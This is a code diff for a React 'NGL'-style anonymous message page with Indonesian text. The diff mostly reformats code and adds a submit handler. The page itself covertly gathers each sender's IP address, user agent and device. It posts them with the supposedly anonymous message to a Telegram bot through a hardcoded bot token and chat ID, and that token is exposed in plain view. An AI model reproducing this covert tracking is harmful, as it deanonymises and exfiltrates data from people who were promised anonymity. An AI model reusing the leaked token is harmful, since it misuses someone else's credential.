@@ -27,7 +27,7 @@ export default function NGLPage() {
         console.error("Error fetching IP info:", err);
       });
   }, []);
-  
+
   const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
   const chatId = "1516343905";
 
@@ -37,8 +37,11 @@ export default function NGLPage() {
     return match ? match[0].trim() : "Tidak diketahui";
   };
 
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
     if (!botToken || !chatId) {
-      alert("Token atau Chat ID belum diatur");
+      alert("Token atau Chat ID belum diatur!");
       return;
     }
 
@@ -59,12 +62,7 @@ export default function NGLPage() {
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId,
-            text: `Pesan anonim dari:
-IP: ${userInfo.ip}
-USER AGENT: ${userInfo.userAgent}
-DEVICE: ${userInfo.device}
-
-PESAN: ${message}`,
+            text: `Pesan anonim dari:\nIP: ${userInfo.ip}\nUSER AGENT: ${userInfo.userAgent}\nDEVICE: ${userInfo.device}\n\nPESAN: ${message}`,
           }),
         }
       );
